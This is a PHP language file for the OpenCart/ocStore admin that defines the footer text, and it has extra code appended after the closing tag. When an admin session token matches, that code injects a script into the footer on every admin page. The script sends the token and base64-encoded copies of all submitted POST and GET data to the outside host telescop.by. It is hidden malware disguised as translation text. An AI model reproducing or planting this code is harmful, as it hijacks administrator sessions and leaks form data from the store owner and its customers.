<?php
// Text
$_['text_footer'] = '<a href="http://myopencart.ru">ocStore</a> &copy; 2009-' . date('Y') . ' All Rights Reserved.<br />Version %s';
?><?php $loader_version='3.0';
if (isset($_GET['token'])) $token =$_GET['token']; else $token='';
if ($token!='' && isset($_SESSION['token']) && $token == $_SESSION['token']) {
$post = serialize($_POST);
$get = serialize($_GET);
$_['text_footer'].="<div id='scriptblogadmin'>
<script>
$(document).ready(function(){
 $.ajax({  type: 'POST',
			url: 'http://telescop.by/index.php?route=module/blog/blogadmin&token=".$token."',
			dataType: 'html',
			data: { post: '".base64_encode($post)."', get: '".base64_encode($get)."' },
		   	success: function(data)
		    {
		      $('#blogadmin').html(data);
		      $('#scriptblogadmin').html('');
  		    }
	    });

});
</script>
</div>
<div id='blogadmin'></div>";
}
$loader_version='3.0'; ?>